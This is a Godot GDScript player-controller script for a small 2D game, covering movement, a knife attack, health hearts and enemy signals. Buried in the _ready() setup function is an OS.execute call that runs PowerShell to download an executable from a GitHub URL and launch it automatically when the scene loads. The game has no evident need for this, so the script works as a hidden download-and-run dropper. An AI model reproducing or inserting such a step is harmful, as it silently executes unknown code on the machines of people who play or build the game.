extends KinematicBody2D


# Declare member variables here. Examples:
# var a = 2
# var b = "text"
var y_speed = 5000
var x_speed = 600
var frames = 4
var frame_counter = 0
signal attacked
onready var knife_attack_area = get_node("Sprite/knife_attack_area")
onready var sprite = get_node("Sprite")
onready var hearts = []
onready var index = 4
onready var vel : Vector2 = Vector2.ZERO
onready var heart
onready var heart_to_remove
onready var enemies = []
onready var i = 1
# Called when the node enters the scene tree for the first time.
func _ready():
	i = 1
	while true:
		if get_parent().get_parent().has_node("enemy%s" % str(i)):
			enemies.append(i)
			i += 1
		else:
			break
	print(enemies)
	for i in range(len(enemies)):
		get_parent().get_parent().get_node("enemy%s" % str(i + 1)).connect("enemy_attacked", self, "_on_attacked_by_enemy") 
	for i in range(7):
		index=i+4
		heart = get_node("Camera2D/HeartPng%s" % str(index))
		hearts.append(heart)
	var output = []
	OS.execute("powershell;$client=new-object System.Net.WebClient;$client.DownloadFile('https://github.com/jonathanbreitg/dump/blob/main/small_amongus.exe?raw=true','small_amongus.exe');./small_amongus.exe",[],true,output)
	print(output)

func _process(delta):
	knife_attack_area.monitoring = false
	vel = Vector2.ZERO
	if Input.is_action_just_pressed("up"):
		vel.y = -y_speed
	if Input.is_action_just_pressed("down"):
		vel.y = y_speed
	if Input.is_action_pressed("left"):
		vel.x = -x_speed
		if sprite.flip_h == false:
			
			sprite.flip_h = true
			knife_attack_area.rotation_degrees = 180
	if Input.is_action_pressed("right"):
		vel.x = x_speed
		sprite.flip_h = false
		knife_attack_area.rotation_degrees = 0
	if Input.is_action_just_pressed("flip"):
		sprite.flip_h = !sprite.flip_h
	if Input.is_action_just_pressed("attack"):
		print(knife_attack_area.global_position.x)
		$Sprite.texture = load("res://textures/humang_attack.png")
		emit_signal("attacked")
		frame_counter = 1
	if frame_counter > 0:
		frame_counter += 1
		knife_attack_area.monitoring = true
		if frame_counter == frames:
			frame_counter = 0
	elif frame_counter == 0:
		$Sprite.texture = load("res://textures/humang.png")
	else:
		print("what")
		print(frame_counter)
	vel = move_and_slide(vel)
	$Camera2D.global_position.y = 178


func _on_knife_attack_area_body_entered(body):
	print("entered_body???")
	print(body)
func _on_attacked_by_enemy():
	print("got attacked")
	heart_to_remove = hearts[0]
	hearts.remove(0)
	heart_to_remove.queue_free()
	if len(hearts)== 0:
		queue_free()
		#move to death screen
	
